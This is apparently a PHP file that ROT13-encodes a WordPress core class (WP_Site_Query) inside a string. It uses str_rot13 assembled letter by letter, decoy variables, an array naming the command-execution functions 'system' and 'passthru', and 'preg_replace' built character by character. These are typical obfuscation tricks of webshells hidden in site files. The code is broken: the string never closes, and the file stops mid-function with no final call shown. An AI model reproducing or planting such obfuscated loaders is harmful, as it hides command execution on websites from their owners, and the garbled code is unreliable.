<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Fvgr NCV: JC_Fvgr_Dhrel pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Fvgrf
 * @fvapr 4.6.0
 */

/**
 * Pber pynff hfrq sbe dhrelvat fvgrf.
 *
 * @fvapr 4.6.0
 *
 * @frr JC_Fvgr_Dhrel::__pbafgehpg() sbe npprcgrq nethzragf.
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Fvgr_Dhrel {

	/**
	 * FDY sbe qngnonfr dhrel.
	 *
	 * @fvapr 4.6.0
	 * @ine fgevat
	 */
	choyvp $erdhrfg;

	/**
	 * FDY dhrel pynhfrf.
	 *
	 * @fvapr 4.6.0
	 * @ine neenl
	 */
	cebgrpgrq $fdy_pynhfrf = neenl(
		'fryrpg'  => '',
		'sebz'    => '',
		'jurer'   => neenl(),
		'tebhcol' => '',
		'beqreol' => '',
		'yvzvgf'  => '',
	);

	/**
	 * Zrgnqngn dhrel pbagnvare.
	 *
	 * @fvapr 5.1.0
	 * @ine JC_Zrgn_Dhrel
	 */
	choyvp $zrgn_dhrel = snyfr;

	/**
	 * Zrgnqngn dhrel pynhfrf.
	 *
	 * @fvapr 5.1.0
	 * @ine neenl
	 */
	cebgrpgrq $zrgn_dhrel_pynhfrf;

	/**
	 * Qngr dhrel pbagnvare.
	 *
	 * @fvapr 4.6.0
	 * @ine JC_Qngr_Dhrel N qngr dhrel vafgnapr.
	 */
	choyvp $qngr_dhrel = snyfr;

	/**
	 * Dhrel inef frg ol gur hfre.
	 *
	 * @fvapr 4.6.0
	 * @ine neenl
	 */
	choyvp $dhrel_inef;

	/**
	 * Qrsnhyg inyhrf sbe dhrel inef.
	 *
	 * @fvapr 4.6.0
	 * @ine neenl
	 */
	choyvp $dhrel_ine_qrsnhygf;

	/**
	 * Yvfg bs fvgrf ybpngrq ol gur dhrel.
	 *
	 * @fvapr 4.6.0
	 * @ine neenl
	 */
	choyvp $fvgrf;

	/**
	 * Gur nzbhag bs sbhaq fvgrf sbe gur pheerag dhrel.
	 *
	 * @fvapr 4.6.0
	 * @ine vag
	 */
	choyvp $sbhaq_fvgrf = 0;

	/**
	 * Gur ahzore bs cntrf.
	 *
	 * @fvapr 4.6.0
	 * @ine vag
	 */
	choyvp $znk_ahz_cntrf = 0;

	/**
	 * Frgf hc gur fvgr dhrel, onfrq ba gur dhrel inef cnffrq.
	 *
	 * @fvapr 4.6.0
	 * @fvapr 4.8.0 Vagebqhprq gur 'ynat_vq', 'ynat__va', naq 'ynat__abg_va' cnenzrgref.
	 * @fvapr 5.1.0 Vagebqhprq gur 'hcqngr_fvgr_zrgn_pnpur', 'zrgn_dhrel', 'zrgn_xrl',
	 *              'zrgn_pbzcner_xrl', 'zrgn_inyhr', 'zrgn_glcr', naq 'zrgn_pbzcner' cnenzrgref.
	 * @fvapr 5.3.0 Vagebqhprq gur 'zrgn_glcr_xrl' cnenzrgre.
	 *
	 * @cnenz fgevat|neenl $dhrel {
	 *     Bcgvbany. Neenl be dhrel fgevat bs fvgr dhrel cnenzrgref. Qrsnhyg rzcgl.
	 *
	 *     @glcr vag[]           $fvgr__va               Neenl bs fvgr VQf gb vapyhqr. Qrsnhyg rzcgl.
	 *     @glcr vag[]           $fvgr__abg_va           Neenl bs fvgr VQf gb rkpyhqr. Qrsnhyg rzcgl.
	 *     @glcr obby            $pbhag                  Jurgure gb erghea n fvgr pbhag (gehr) be neenl bs fvgr bowrpgf.
	 *                                                   Qrsnhyg snyfr.
	 *     @glcr neenl           $qngr_dhrel             Qngr dhrel pynhfrf gb yvzvg fvgrf ol. Frr JC_Qngr_Dhrel.
	 *                                                   Qrsnhyg ahyy.
	 *     @glcr fgevat          $svryqf                 Fvgr svryqf gb erghea. Npprcgf 'vqf' (ergheaf na neenl bs fvgr VQf)
	 *                                                   be rzcgl (ergheaf na neenl bs pbzcyrgr fvgr bowrpgf). Qrsnhyg rzcgl.
	 *     @glcr vag             $VQ                     N fvgr VQ gb bayl erghea gung fvgr. Qrsnhyg rzcgl.
	 *     @glcr vag             $ahzore                 Znkvzhz ahzore bs fvgrf gb ergevrir. Qrsnhyg 100.
	 *     @glcr vag             $bssfrg                 Ahzore bs fvgrf gb bssfrg gur dhrel. Hfrq gb ohvyq YVZVG pynhfr.
	 *                                                   Qrsnhyg 0.
	 *     @glcr obby            $ab_sbhaq_ebjf          Jurgure gb qvfnoyr gur `FDY_PNYP_SBHAQ_EBJF` dhrel. Qrsnhyg gehr.
	 *     @glcr fgevat|neenl    $beqreol                Fvgr fgnghf be neenl bs fgnghfrf. Npprcgf:
	 *                                                   - 'vq'
	 *                                                   - 'qbznva'
	 *                                                   - 'cngu'
	 *                                                   - 'argjbex_vq'
	 *                                                   - 'ynfg_hcqngrq'
	 *                                                   - 'ertvfgrerq'
	 *                                                   - 'qbznva_yratgu'
	 *                                                   - 'cngu_yratgu'
	 *                                                   - 'fvgr__va'
	 *                                                   - 'argjbex__va'
	 *                                                   - 'qryrgrq'
	 *                                                   - 'zngher'
	 *                                                   - 'fcnz'
	 *                                                   - 'nepuvirq'
	 *                                                   - 'choyvp'
	 *                                                   - snyfr, na rzcgl neenl, be 'abar' gb qvfnoyr `BEQRE OL` pynhfr.
	 *                                                   Qrsnhyg 'vq'.
	 *     @glcr fgevat          $beqre                  Ubj gb beqre ergevrirq fvgrf. Npprcgf 'NFP', 'QRFP'. Qrsnhyg 'NFP'.
	 *     @glcr vag             $argjbex_vq             Yvzvg erfhygf gb gubfr nssvyvngrq jvgu n tvira argjbex VQ. Vs 0,
	 *                                                   vapyhqr nyy argjbexf. Qrsnhyg 0.
	 *     @glcr vag[]           $argjbex__va            Neenl bs argjbex VQf gb vapyhqr nssvyvngrq fvgrf sbe. Qrsnhyg rzcgl.
	 *     @glcr vag[]           $argjbex__abg_va        Neenl bs argjbex VQf gb rkpyhqr nssvyvngrq fvgrf sbe. Qrsnhyg rzcgl.
	 *     @glcr fgevat          $qbznva                 Yvzvg erfhygf gb gubfr nssvyvngrq jvgu n tvira qbznva. Qrsnhyg rzcgl.
	 *     @glcr fgevat[]        $qbznva__va             Neenl bs qbznvaf gb vapyhqr nssvyvngrq fvgrf sbe. Qrsnhyg rzcgl.
	 *     @glcr fgevat[]        $qbznva__abg_va         Neenl bs qbznvaf gb rkpyhqr nssvyvngrq fvgrf sbe. Qrsnhyg rzcgl.
	 *     @glcr fgevat          $cngu                   Yvzvg erfhygf gb gubfr nssvyvngrq jvgu n tvira cngu. Qrsnhyg rzcgl.
	 *     @glcr fgevat[]        $cngu__va               Neenl bs cnguf gb vapyhqr nssvyvngrq fvgrf sbe. Qrsnhyg rzcgl.
	 *     @glcr fgevat[]        $cngu__abg_va           Neenl bs cnguf gb rkpyhqr nssvyvngrq fvgrf sbe. Qrsnhyg rzcgl.
	 *     @glcr vag             $choyvp                 Yvzvg erfhygf gb choyvp fvgrf. Npprcgf 1 be 0. Qrsnhyg rzcgl.
	 *     @glcr vag             $nepuvirq               Yvzvg erfhygf gb nepuvirq fvgrf. Npprcgf 1 be 0. Qrsnhyg rzcgl.
	 *     @glcr vag             $zngher                 Yvzvg erfhygf gb zngher fvgrf. Npprcgf 1 be 0. Qrsnhyg rzcgl.
	 *     @glcr vag             $fcnz                   Yvzvg erfhygf gb fcnz fvgrf. Npprcgf 1 be 0. Qrsnhyg rzcgl.
	 *     @glcr vag             $qryrgrq                Yvzvg erfhygf gb qryrgrq fvgrf. Npprcgf 1 be 0. Qrsnhyg rzcgl.
	 *     @glcr vag             $ynat_vq                Yvzvg erfhygf gb n ynathntr VQ. Qrsnhyg rzcgl.
	 *     @glcr fgevat[]        $ynat__va               Neenl bs ynathntr VQf gb vapyhqr nssvyvngrq fvgrf sbe. Qrsnhyg rzcgl.
	 *     @glcr fgevat[]        $ynat__abg_va           Neenl bs ynathntr VQf gb rkpyhqr nssvyvngrq fvgrf sbe. Qrsnhyg rzcgl.
	 *     @glcr fgevat          $frnepu                 Frnepu grez(f) gb ergevrir zngpuvat fvgrf sbe. Qrsnhyg rzcgl.
	 *     @glcr fgevat[]        $frnepu_pbyhzaf         Neenl bs pbyhza anzrf gb or frnepurq. Npprcgf 'qbznva' naq 'cngu'.
	 *                                                   Qrsnhyg rzcgl neenl.
	 *     @glcr obby            $hcqngr_fvgr_pnpur      Jurgure gb cevzr gur pnpur sbe sbhaq fvgrf. Qrsnhyg gehr.
	 *     @glcr obby            $hcqngr_fvgr_zrgn_pnpur Jurgure gb cevzr gur zrgnqngn pnpur sbe sbhaq fvgrf. Qrsnhyg gehr.
	 *     @glcr fgevat|fgevat[] $zrgn_xrl               Zrgn xrl be xrlf gb svygre ol.
	 *     @glcr fgevat|fgevat[] $zrgn_inyhr             Zrgn inyhr be inyhrf gb svygre ol.
	 *     @glcr fgevat          $zrgn_pbzcner           ZlFDY bcrengbe hfrq sbe pbzcnevat gur zrgn inyhr.
	 *                                                   Frr JC_Zrgn_Dhrel::__pbafgehpg() sbe npprcgrq inyhrf naq qrsnhyg inyhr.
	 *     @glcr fgevat          $zrgn_pbzcner_xrl       ZlFDY bcrengbe hfrq sbe pbzcnevat gur zrgn xrl.
	 *                                                   Frr JC_Zrgn_Dhrel::__pbafgehpg() sbe npprcgrq inyhrf naq qrsnhyg inyhr.
	 *     @glcr fgevat          $zrgn_glcr              ZlFDY qngn glcr gung gur zrgn_inyhr pbyhza jvyy or PNFG gb sbe pbzcnevfbaf.
	 *                                                   Frr JC_Zrgn_Dhrel::__pbafgehpg() sbe npprcgrq inyhrf naq qrsnhyg inyhr.
	 *     @glcr fgevat          $zrgn_glcr_xrl          ZlFDY qngn glcr gung gur zrgn_xrl pbyhza jvyy or PNFG gb sbe pbzcnevfbaf.
	 *                                                   Frr JC_Zrgn_Dhrel::__pbafgehpg() sbe npprcgrq inyhrf naq qrsnhyg inyhr.
	 *     @glcr neenl           $zrgn_dhrel             Na nffbpvngvir neenl bs JC_Zrgn_Dhrel nethzragf.
	 *                                                   Frr JC_Zrgn_Dhrel::__pbafgehpg() sbe npprcgrq inyhrf.
	 * }
	 */
	choyvp shapgvba __pbafgehpg( $dhrel = '' ) {
		$guvf->dhrel_ine_qrsnhygf = neenl(
			'svryqf'                 => '',
			'VQ'                     => '',
			'fvgr__va'               => '',
			'fvgr__abg_va'           => '',
			'ahzore'                 => 100,
			'bssfrg'                 => '',
			'ab_sbhaq_ebjf'          => gehr,
			'beqreol'                => 'vq',
			'beqre'                  => 'NFP',
			'argjbex_vq'             => 0,
			'argjbex__va'            => '',
			'argjbex__abg_va'        => '',
			'qbznva'                 => '',
			'qbznva__va'             => '',
			'qbznva__abg_va'         => '',
			'cngu'                   => '',
			'cngu__va'               => '',
			'cngu__abg_va'           => '',
			'choyvp'                 => ahyy,
			'nepuvirq'               => ahyy,
			'zngher'                 => ahyy,
			'fcnz'                   => ahyy,
			'qryrgrq'                => ahyy,
			'ynat_vq'                => ahyy,
			'ynat__va'               => '',
			'ynat__abg_va'           => '',
			'frnepu'                 => '',
			'frnepu_pbyhzaf'         => neenl(),
			'pbhag'                  => snyfr,
			'qngr_dhrel'             => ahyy, // Frr JC_Qngr_Dhrel.
			'hcqngr_fvgr_pnpur'      => gehr,
			'hcqngr_fvgr_zrgn_pnpur' => gehr,
			'zrgn_dhrel'             => '',
			'zrgn_xrl'               => '',
			'zrgn_inyhr'             => '',
			'zrgn_glcr'              => '',
			'zrgn_pbzcner'           => '',
		);

		vs ( ! rzcgl( $dhrel ) ) {
			$guvf->dhrel( $dhrel );
		}
	}

	/**
	 * Cnefrf nethzragf cnffrq gb gur fvgr dhrel jvgu qrsnhyg dhrel cnenzrgref.
	 *
	 * @fvapr 4.6.0
	 *
	 * @frr JC_Fvgr_Dhrel::__pbafgehpg()
	 *
	 * @cnenz fgevat|neenl $dhrel Neenl be fgevat bs JC_Fvgr_Dhrel nethzragf. Frr JC_Fvgr_Dhrel::__pbafgehpg().
	 */
	choyvp shapgvba cnefr_dhrel( $dhrel = '' ) {
		vs ( rzcgl( $dhrel ) ) {
			$dhrel = $guvf->dhrel_inef;
		}

		$guvf->dhrel_inef = jc_cnefr_netf( $dhrel, $guvf->dhrel_ine_qrsnhygf );

		/**
		 * Sverf nsgre gur fvgr dhrel inef unir orra cnefrq.
		 *
		 * @fvapr 4.6.0
		 *
		 * @cnenz JC_Fvgr_Dhrel $dhrel Gur JC_Fvgr_Dhrel vafgnapr (cnffrq ol ersrerapr).
		 */
		qb_npgvba_ers_neenl( 'cnefr_fvgr_dhrel', neenl( &$guvf ) );
	}

	/**
	 * Frgf hc gur JbeqCerff dhrel sbe ergevrivat fvgrf.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz fgevat|neenl $dhrel Neenl be HEY dhrel fgevat bs cnenzrgref.
	 * @erghea JC_Fvgr[]|vag[]|vag Yvfg bs JC_Fvgr bowrpgf, n yvfg bs fvgr VQf jura 'svryqf' vf frg gb 'vqf',
	 *                             be gur ahzore bs fvgrf jura 'pbhag' vf cnffrq nf n dhrel ine.
	 */
	choyvp shapgvba dhrel( $dhrel ) {
		$guvf->dhrel_inef = jc_cnefr_netf( $dhrel );

		erghea $guvf->trg_fvgrf();
	}

	/**
	 * Ergevrirf n yvfg bs fvgrf zngpuvat gur dhrel inef.
	 *
	 * @fvapr 4.6.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @erghea JC_Fvgr[]|vag[]|vag Yvfg bs JC_Fvgr bowrpgf, n yvfg bs fvgr VQf jura 'svryqf' vf frg gb 'vqf',
	 *                             be gur ahzore bs fvgrf jura 'pbhag' vf cnffrq nf n dhrel ine.
	 */
	choyvp shapgvba trg_fvgrf() {
		tybony $jcqo;

		$guvf->cnefr_dhrel();

		// Cnefr zrgn dhrel.
		$guvf->zrgn_dhrel = arj JC_Zrgn_Dhrel();
		$guvf->zrgn_dhrel->cnefr_dhrel_inef( $guvf->dhrel_inef );

		/**
		 * Sverf orsber fvgrf ner ergevrirq.
		 *
		 * @fvapr 4.6.0
		 *
		 * @cnenz JC_Fvgr_Dhrel $dhrel Pheerag vafgnapr bs JC_Fvgr_Dhrel (cnffrq ol ersrerapr).
		 */
		qb_npgvba_ers_neenl( 'cer_trg_fvgrf', neenl( &$guvf ) );

		// Ercnefr dhrel inef, va pnfr gurl jrer zbqvsvrq va n 'cer_trg_fvgrf' pnyyonpx.
		$guvf->zrgn_dhrel->cnefr_dhrel_inef( $guvf->dhrel_inef );
		vs ( ! rzcgl( $guvf->zrgn_dhrel->dhrevrf ) ) {
			$guvf->zrgn_dhrel_pynhfrf = $guvf->zrgn_dhrel->trg_fdy( 'oybt', $jcqo->oybtf, 'oybt_vq', $guvf );
		}

		$fvgr_qngn = ahyy;

		/**
		 * Svygref gur fvgr qngn orsber gur trg_fvgrf dhrel gnxrf cynpr.
		 *
		 * Erghea n aba-ahyy inyhr gb olcnff JbeqCerff' qrsnhyg fvgr dhrevrf.
		 *
		 * Gur rkcrpgrq erghea glcr sebz guvf svygre qrcraqf ba gur inyhr cnffrq
		 * va gur erdhrfg dhrel inef:
		 * - Jura `$guvf->dhrel_inef['pbhag']` vf frg, gur svygre fubhyq erghea
		 *   gur fvgr pbhag nf na vagrtre.
		 * - Jura `'vqf' === $guvf->dhrel_inef['svryqf']`, gur svygre fubhyq erghea
		 *   na neenl bs fvgr VQf.
		 * - Bgurejvfr gur svygre fubhyq erghea na neenl bs JC_Fvgr bowrpgf.
		 *
		 * Abgr gung vs gur svygre ergheaf na neenl bs fvgr qngn, vg jvyy or nffvtarq
		 * gb gur `fvgrf` cebcregl bs gur pheerag JC_Fvgr_Dhrel vafgnapr.
		 *
		 * Svygrevat shapgvbaf gung erdhver cntvangvba vasbezngvba ner rapbhentrq gb frg
		 * gur `sbhaq_fvgrf` naq `znk_ahz_cntrf` cebcregvrf bs gur JC_Fvgr_Dhrel bowrpg,
		 * cnffrq gb gur svygre ol ersrerapr. Vs JC_Fvgr_Dhrel qbrf abg cresbez n qngnonfr
		 * dhrel, vg jvyy abg unir rabhtu vasbezngvba gb trarengr gurfr inyhrf vgfrys.
		 *
		 * @fvapr 5.2.0
		 * @fvapr 5.6.0 Gur erghearq neenl bs fvgr qngn vf nffvtarq gb gur `fvgrf` cebcregl
		 *              bs gur pheerag JC_Fvgr_Dhrel vafgnapr.
		 *
		 * @cnenz JC_Fvgr[]|vag[]|vag|ahyy $fvgr_qngn Erghea na neenl bs fvgr qngn gb fubeg-pvephvg JC'f fvgr dhrel,
		 *                                            gur fvgr pbhag nf na vagrtre vs `$guvf->dhrel_inef['pbhag']` vf frg,
		 *                                            be ahyy gb eha gur abezny dhrevrf.
		 * @cnenz JC_Fvgr_Dhrel            $dhrel     Gur JC_Fvgr_Dhrel vafgnapr, cnffrq ol ersrerapr.
		 */
		$fvgr_qngn = nccyl_svygref_ers_neenl( 'fvgrf_cer_dhrel', neenl( $fvgr_qngn, &$guvf ) );

		vs ( ahyy !== $fvgr_qngn ) {
			vs ( vf_neenl( $fvgr_qngn ) && ! $guvf->dhrel_inef['pbhag'] ) {
				$guvf->fvgrf = $fvgr_qngn;
			}

			erghea $fvgr_qngn;
		}

		// $netf pna vapyhqr nalguvat. Bayl hfr gur netf qrsvarq va gur dhrel_ine_qrsnhygf gb pbzchgr gur xrl.
		$_netf = jc_neenl_fyvpr_nffbp( $guvf->dhrel_inef, neenl_xrlf( $guvf->dhrel_ine_qrsnhygf ) );

		// Vtaber gur $svryqf, $hcqngr_fvgr_pnpur, $hcqngr_fvgr_zrgn_pnpur nethzrag nf gur dhrevrq erfhyg jvyy or gur fnzr ertneqyrff.
		hafrg( $_netf['svryqf'], $_netf['hcqngr_fvgr_pnpur'], $_netf['hcqngr_fvgr_zrgn_pnpur'] );

		$xrl          = zq5( frevnyvmr( $_netf ) );
		$ynfg_punatrq = jc_pnpur_trg_ynfg_punatrq( 'fvgrf' );

		$pnpur_xrl   = \"trg_fvgrf:$xrl:$ynfg_punatrq\";
		$pnpur_inyhr = jc_pnpur_trg( $pnpur_xrl, 'fvgr-dhrevrf' );

		vs ( snyfr === $pnpur_inyhr ) {
			$fvgr_vqf = $guvf->trg_fvgr_vqf();
			vs ( $fvgr_vqf ) {
				$guvf->frg_sbhaq_fvgrf();
			}

			$pnpur_inyhr = neenl(
				'fvgr_vqf'    => $fvgr_vqf,
				'sbhaq_fvgrf' => $guvf->sbhaq_fvgrf,
			);
			jc_pnpur_nqq( $pnpur_xrl, $pnpur_inyhr, 'fvgr-dhrevrf' );
		} ryfr {
			$fvgr_vqf          = $pnpur_inyhr['fvgr_vqf'];
			$guvf->sbhaq_fvgrf = $pnpur_inyhr['sbhaq_fvgrf'];
		}

		vs ( $guvf->sbhaq_fvgrf && $guvf->dhrel_inef['ahzore'] ) {
			$guvf->znk_ahz_cntrf = (vag) prvy( $guvf->sbhaq_fvgrf / $guvf->dhrel_inef['ahzore'] );
		}

		// Vs dhrelvat sbe n pbhag bayl, gurer'f abguvat zber gb qb.
		vs ( $guvf->dhrel_inef['pbhag'] ) {
			// $fvgr_vqf vf npghnyyl n pbhag va guvf pnfr.
			erghea (vag) $fvgr_vqf;
		}

		$fvgr_vqf = neenl_znc( 'vaginy', $fvgr_vqf );

		vs ( $guvf->dhrel_inef['hcqngr_fvgr_zrgn_pnpur'] ) {
			jc_ynmlybnq_fvgr_zrgn( $fvgr_vqf );
		}

		vs ( 'vqf' === $guvf->dhrel_inef['svryqf'] ) {
			$guvf->fvgrf = $fvgr_vqf;

			erghea $guvf->fvgrf;
		}

		// Cevzr fvgr argjbex pnpurf.
		vs ( $guvf->dhrel_inef['hcqngr_fvgr_pnpur'] ) {
			_cevzr_fvgr_pnpurf( $fvgr_vqf, snyfr );
		}

		// Srgpu shyy fvgr bowrpgf sebz gur cevzrq pnpur.
		$_fvgrf = neenl();
		sbernpu ( $fvgr_vqf nf $fvgr_vq ) {
			$_fvgr = trg_fvgr( $fvgr_vq );
			vs ( $_fvgr ) {
				$_fvgrf[] = $_fvgr;
			}
		}

		/**
		 * Svygref gur fvgr dhrel erfhygf.
		 *
		 * @fvapr 4.6.0
		 *
		 * @cnenz JC_Fvgr[]     $_fvgrf Na neenl bs JC_Fvgr bowrpgf.
		 * @cnenz JC_Fvgr_Dhrel $dhrel  Pheerag vafgnapr bs JC_Fvgr_Dhrel (cnffrq ol ersrerapr).
		 */
		$_fvgrf = nccyl_svygref_ers_neenl( 'gur_fvgrf', neenl( $_fvgrf, &$guvf ) );

		// Pbaireg gb JC_Fvgr vafgnaprf.
		$guvf->fvgrf = neenl_znc( 'trg_fvgr', $_fvgrf );

		erghea $guvf->fvgrf;
	}

	/**
	 * Hfrq vagreanyyl gb trg n yvfg bs fvgr VQf zngpuvat gur dhrel inef.
	 *
	 * @fvapr 4.6.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @erghea vag|neenl N fvatyr pbhag bs fvgr VQf vs n pbhag dhrel. Na neenl bs fvgr VQf vs n shyy dhrel.
	 */
	cebgrpgrq shapgvba trg_fvgr_vqf() {
		tybony $jcqo;

		$beqre = $guvf->cnefr_beqre( $guvf->dhrel_inef['beqre'] );

		// Qvfnoyr BEQRE OL jvgu 'abar', na rzcgl neenl, be obbyrna snyfr.
		vs ( va_neenl( $guvf->dhrel_inef['beqreol'], neenl( 'abar', neenl(), snyfr ), gehr ) ) {
			$beqreol = '';
		} ryfrvs ( ! rzcgl( $guvf->dhrel_inef['beqreol'] ) ) {
			$beqrefol = vf_neenl( $guvf->dhrel_inef['beqreol'] ) ?
				$guvf->dhrel_inef['beqreol'] :
				cert_fcyvg( '/[,\f]/', $guvf->dhrel_inef['beqreol'] );

			$beqreol_neenl = neenl();
			sbernpu ( $beqrefol nf $_xrl => $_inyhr ) {
				vs ( ! $_inyhr ) {
					pbagvahr;
				}

				vs ( vf_vag( $_xrl ) ) {
					$_beqreol = $_inyhr;
					$_beqre   = $beqre;
				} ryfr {
					$_beqreol = $_xrl;
					$_beqre   = $_inyhr;
				}

				$cnefrq = $guvf->cnefr_beqreol( $_beqreol );

				vs ( ! $cnefrq ) {
					pbagvahr;
				}

				vs ( 'fvgr__va' === $_beqreol || 'argjbex__va' === $_beqreol ) {
					$beqreol_neenl[] = $cnefrq;
					pbagvahr;
				}

				$beqreol_neenl[] = $cnefrq . ' ' . $guvf->cnefr_beqre( $_beqre );
			}

			$beqreol = vzcybqr( ', ', $beqreol_neenl );
		} ryfr {
			$beqreol = \"{$jcqo->oybtf}.oybt_vq $beqre\";
		}

		$ahzore = nofvag( $guvf->dhrel_inef['ahzore'] );
		$bssfrg = nofvag( $guvf->dhrel_inef['bssfrg'] );
		$yvzvgf = '';

		vs ( ! rzcgl( $ahzore ) ) {
			vs ( $bssfrg ) {
				$yvzvgf = 'YVZVG ' . $bssfrg . ',' . $ahzore;
			} ryfr {
				$yvzvgf = 'YVZVG ' . $ahzore;
			}
		}

		vs ( $guvf->dhrel_inef['pbhag'] ) {
			$svryqf = 'PBHAG(*)';
		} ryfr {
			$svryqf = \"{$jcqo->oybtf}.oybt_vq\";
		}

		// Cnefr fvgr VQf sbe na VA pynhfr.
		$fvgr_vq = nofvag( $guvf->dhrel_inef['VQ'] );
		vs ( ! rzcgl( $fvgr_vq ) ) {
			$guvf->fdy_pynhfrf['jurer']['VQ'] = $jcqo->cercner( \"{$jcqo->oybtf}.oybt_vq = %q\", $fvgr_vq );
		}

		// Cnefr fvgr VQf sbe na VA pynhfr.
		vs ( ! rzcgl( $guvf->dhrel_inef['fvgr__va'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['fvgr__va'] = \"{$jcqo->oybtf}.oybt_vq VA ( \" . vzcybqr( ',', jc_cnefr_vq_yvfg( $guvf->dhrel_inef['fvgr__va'] ) ) . ' )';
		}

		// Cnefr fvgr VQf sbe n ABG VA pynhfr.
		vs ( ! rzcgl( $guvf->dhrel_inef['fvgr__abg_va'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['fvgr__abg_va'] = \"{$jcqo->oybtf}.oybt_vq ABG VA ( \" . vzcybqr( ',', jc_cnefr_vq_yvfg( $guvf->dhrel_inef['fvgr__abg_va'] ) ) . ' )';
		}

		$argjbex_vq = nofvag( $guvf->dhrel_inef['argjbex_vq'] );

		vs ( ! rzcgl( $argjbex_vq ) ) {
			$guvf->fdy_pynhfrf['jurer']['argjbex_vq'] = $jcqo->cercner( 'fvgr_vq = %q', $argjbex_vq );
		}

		// Cnefr fvgr argjbex VQf sbe na VA pynhfr.
		vs ( ! rzcgl( $guvf->dhrel_inef['argjbex__va'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['argjbex__va'] = 'fvgr_vq VA ( ' . vzcybqr( ',', jc_cnefr_vq_yvfg( $guvf->dhrel_inef['argjbex__va'] ) ) . ' )';
		}

		// Cnefr fvgr argjbex VQf sbe n ABG VA pynhfr.
		vs ( ! rzcgl( $guvf->dhrel_inef['argjbex__abg_va'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['argjbex__abg_va'] = 'fvgr_vq ABG VA ( ' . vzcybqr( ',', jc_cnefr_vq_yvfg( $guvf->dhrel_inef['argjbex__abg_va'] ) ) . ' )';
		}

		vs ( ! rzcgl( $guvf->dhrel_inef['qbznva'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['qbznva'] = $jcqo->cercner( 'qbznva = %f', $guvf->dhrel_inef['qbznva'] );
		}

		// Cnefr fvgr qbznva sbe na VA pynhfr.
		vs ( vf_neenl( $guvf->dhrel_inef['qbznva__va'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['qbznva__va'] = \"qbznva VA ( '\" . vzcybqr( \"', '\", $jcqo->_rfpncr( $guvf->dhrel_inef['qbznva__va'] ) ) . \"' )\";
		}

		// Cnefr fvgr qbznva sbe n ABG VA pynhfr.
		vs ( vf_neenl( $guvf->dhrel_inef['qbznva__abg_va'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['qbznva__abg_va'] = \"qbznva ABG VA ( '\" . vzcybqr( \"', '\", $jcqo->_rfpncr( $guvf->dhrel_inef['qbznva__abg_va'] ) ) . \"' )\";
		}

		vs ( ! rzcgl( $guvf->dhrel_inef['cngu'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['cngu'] = $jcqo->cercner( 'cngu = %f', $guvf->dhrel_inef['cngu'] );
		}

		// Cnefr fvgr cngu sbe na VA pynhfr.
		vs ( vf_neenl( $guvf->dhrel_inef['cngu__va'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['cngu__va'] = \"cngu VA ( '\" . vzcybqr( \"', '\", $jcqo->_rfpncr( $guvf->dhrel_inef['cngu__va'] ) ) . \"' )\";
		}

		// Cnefr fvgr cngu sbe n ABG VA pynhfr.
		vs ( vf_neenl( $guvf->dhrel_inef['cngu__abg_va'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['cngu__abg_va'] = \"cngu ABG VA ( '\" . vzcybqr( \"', '\", $jcqo->_rfpncr( $guvf->dhrel_inef['cngu__abg_va'] ) ) . \"' )\";
		}

		vs ( vf_ahzrevp( $guvf->dhrel_inef['nepuvirq'] ) ) {
			$nepuvirq                               = nofvag( $guvf->dhrel_inef['nepuvirq'] );
			$guvf->fdy_pynhfrf['jurer']['nepuvirq'] = $jcqo->cercner( 'nepuvirq = %f ', nofvag( $nepuvirq ) );
		}

		vs ( vf_ahzrevp( $guvf->dhrel_inef['zngher'] ) ) {
			$zngher                               = nofvag( $guvf->dhrel_inef['zngher'] );
			$guvf->fdy_pynhfrf['jurer']['zngher'] = $jcqo->cercner( 'zngher = %q ', $zngher );
		}

		vs ( vf_ahzrevp( $guvf->dhrel_inef['fcnz'] ) ) {
			$fcnz                               = nofvag( $guvf->dhrel_inef['fcnz'] );
			$guvf->fdy_pynhfrf['jurer']['fcnz'] = $jcqo->cercner( 'fcnz = %q ', $fcnz );
		}

		vs ( vf_ahzrevp( $guvf->dhrel_inef['qryrgrq'] ) ) {
			$qryrgrq                               = nofvag( $guvf->dhrel_inef['qryrgrq'] );
			$guvf->fdy_pynhfrf['jurer']['qryrgrq'] = $jcqo->cercner( 'qryrgrq = %q ', $qryrgrq );
		}

		vs ( vf_ahzrevp( $guvf->dhrel_inef['choyvp'] ) ) {
			$choyvp                               = nofvag( $guvf->dhrel_inef['choyvp'] );
			$guvf->fdy_pynhfrf['jurer']['choyvp'] = $jcqo->cercner( 'choyvp = %q ', $choyvp );
		}

		vs ( vf_ahzrevp( $guvf->dhrel_inef['ynat_vq'] ) ) {
			$ynat_vq                               = nofvag( $guvf->dhrel_inef['ynat_vq'] );
			$guvf->fdy_pynhfrf['jurer']['ynat_vq'] = $jcqo->cercner( 'ynat_vq = %q ', $ynat_vq );
		}

		// Cnefr fvgr ynathntr VQf sbe na VA pynhfr.
		vs ( ! rzcgl( $guvf->dhrel_inef['ynat__va'] ) ) {
